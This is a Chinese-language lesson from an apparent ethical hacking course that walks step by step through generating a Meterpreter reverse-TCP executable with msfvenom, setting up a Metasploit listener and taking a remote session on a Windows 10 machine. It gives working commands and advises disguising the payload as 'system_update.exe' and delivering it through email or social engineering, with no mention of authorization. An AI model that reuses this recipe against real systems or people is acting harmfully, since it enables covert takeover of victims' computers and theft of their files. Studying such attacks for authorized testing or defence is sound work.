
# 完整道德黑客课程 2026：39：使用 Msfvenom 获取控制权 🔓

在本节课中，我们将要学习如何使用 Msfvenom 工具生成一个针对 Windows 10 系统的载荷，并通过 Metasploit 框架获得对目标电脑的远程控制权。整个过程包含生成恶意文件、把文件传输到目标机器、在攻击机上开启监听器，以及建立会话之后执行命令几个主要步骤。请跟着我一步步操作，不要跳过任何一个环节，哪怕是看起来很简单的设置也要认真核对。

![](img/c7cb378a3fa80835a901b8ff1562f734_1.png)

![](img/c7cb378a3fa80835a901b8ff1562f734_2.png)

好了，概述部分已经讲完了，下面我们进入第一个实际操作环节。在发起任何远程连接之前，首先得知道自己攻击机器的网络地址，否则监听器无法知道要把连接发送到哪里去。

以下是查看本地 IP 地址的操作步骤。

![](img/c7cb378a3fa80835a901b8ff1562f734_4.png)

打开 Kali Linux 的终端窗口，输入登录密码后进入命令行界面。接着你需要找到本机的局域网 IP 地址，在我的演示环境中，这个地址是 192.168.0.109，它属于 wlan0 网卡。你可以把这个地址记在记事本里，或者干脆记住它，后面生成载荷时会反复用到。

![](img/c7cb378a3fa80835a901b8ff1562f734_6.png)

```bash
ip addr
```

攻击机的本地地址通常可以用下面这个简单的关系来理解：

LHOST = 192.168.0.109
LPORT = 4444

拿到 IP 地址之后，接下来就是生成我们要用的恶意载荷文件了。没有这个文件，我们就没有办法在目标电脑上建立连接。

以下是使用 msfvenom 生成 payload 的完整命令。

我们要在 Kali Linux 中生成一个 Windows meterpreter reverse TCP 类型的载荷，并且这个文件最终会被发送到目标 Windows 10 操作系统。文件名你可以随意起，为了让文件看起来不那么可疑，我把它命名为 system_update.exe，你也可以叫 Windows 10 update.exe、virus.exe、payload.exe，反正随你喜欢。在命令里，本地主机地址设置为 192.168.0.109，端口设置为 4444。

![](img/c7cb378a3fa80835a901b8ff1562f734_8.png)

![](img/c7cb378a3fa80835a901b8ff1562f734_9.png)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.109 LPORT=4444 -f exe -o system_update.exe
```

载荷类型的核心设置可以这样表示：

![](img/c7cb378a3fa80835a901b8ff1562f734_11.png)

payload_type = windows/meterpreter/reverse_tcp
LHOST = 攻击机 IP 地址
LPORT = 监听端口号

生成完成之后，文件大小大约是 73802 字节，通常会保存到你当前所在的文件夹或者文件资源管理器里。请记住这个文件的具体位置，一会儿我们需要把它发送给目标机器。

![](img/c7cb378a3fa80835a901b8ff1562f734_13.png)

载荷文件已经准备好了，但它还躺在我们自己的电脑里，必须想办法把它传到目标 Windows 10 机器上才能继续。

以下是几种常见的文件传输方式。

你只需要把这个生成好的 system_update.exe 文件发送到目标 Windows 10 操作系统。具体怎么传，完全看你的实际情况，可以用 U 盘拷贝，也可以通过 Gmail 发送，或者利用社交工程学的方法诱导对方下载运行。关键是目标用户要在自己的电脑上打开这个文件，否则后面的回连永远建立不起来。

![](img/c7cb378a3fa80835a901b8ff1562f734_15.png)

- U 盘拷贝
- 电子邮件附件
- 社交工程诱导下载

![](img/c7cb378a3fa80835a901b8ff1562f734_17.png)

文件传过去之后，我们需要在攻击机上开启监听器，等待目标机器运行载荷后建立回连。如果不开启监听，目标运行文件也只是在本地执行，跟我们没关系。

![](img/c7cb378a3fa80835a901b8ff1562f734_19.png)

![](img/c7cb378a3fa80835a901b8ff1562f734_21.png)

以下是配置 msfconsole 监听的详细步骤。

![](img/c7cb378a3fa80835a901b8ff1562f734_23.png)

打开一个新的终端窗口，输入 msfconsole 启动 Metasploit 控制台。然后选择 exploit/multi/handler 模块，设置 payload 为 windows/meterpreter/reverse_tcp，接着把 LHOST 设成 192.168.0.109，LPORT 设成 4444，配置完成后输入 show options 查看当前参数是否正确，最后执行 run 或 exploit 开始监听。

![](img/c7cb378a3fa80835a901b8ff1562f734_24.png)

![](img/c7cb378a3fa80835a901b8ff1562f734_26.png)

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.109
set LPORT 4444
show options
run
```

![](img/c7cb378a3fa80835a901b8ff1562f734_28.png)

![](img/c7cb378a3fa80835a901b8ff1562f734_30.png)

监听模块的核心配置如下：

![](img/c7cb378a3fa80835a901b8ff1562f734_32.png)

handler = exploit/multi/handler
session = meterpreter

![](img/c7cb378a3fa80835a901b8ff1562f734_34.png)

监听器已经启动并开始等待连接，接下来就要看目标机器那边的表现了。如果目标用户没有运行那个文件，监听器就会一直处于等待状态。

![](img/c7cb378a3fa80835a901b8ff1562f734_36.png)

以下是在目标系统上执行载荷后的预期结果。

当你在 Windows 10 目标机器上运行 system_update.exe 文件之后，程序会在后台尝试连接回我们的 Kali 监听器。一旦连接成功，msfconsole 里就会出现一个 Meterpreter 会话，这时候你就已经拿到了对目标电脑的控制权。你可以输入 help 命令查看所有可用的操作指令，比如 sysinfo 可以获取目标 Windows 10 的系统信息，其他信息命令也可以依次尝试。

```bash
sessions -i 1
sysinfo
help
```

![](img/c7cb378a3fa80835a901b8ff1562f734_38.png)

![](img/c7cb378a3fa80835a901b8ff1562f734_39.png)

拿到会话之后，你不需要立刻去做什么复杂的事情，先熟悉几个基础命令即可。help 命令会列出所有支持的操作，sysinfo 会显示目标系统的版本、计算机名和语言等信息，这些都是后续渗透测试的重要参考。

![](img/c7cb378a3fa80835a901b8ff1562f734_41.png)

以下是获取会话后常用的几个 Meterpreter 命令。

- help：查看帮助文档
- sysinfo：查看系统信息
- shell：获取系统命令行
- download：下载目标文件
- upload：上传文件到目标

命令都掌握之后，这节课的核心内容也就讲完了，下面进行最后的总结。

![](img/c7cb378a3fa80835a901b8ff1562f734_43.png)

本节课中，我们一起学习了如何使用 Msfvenom 生成 Windows meterpreter reverse TCP 载荷，如何将其传输到目标 Windows 10 系统，以及如何在 Metasploit 中配置多功能处理器监听器，最终获得 Meterpreter 会话并执行基础系统信息查询。掌握这些步骤后，你就具备了进行远程控制测试的基础能力，希望在下一节课见。
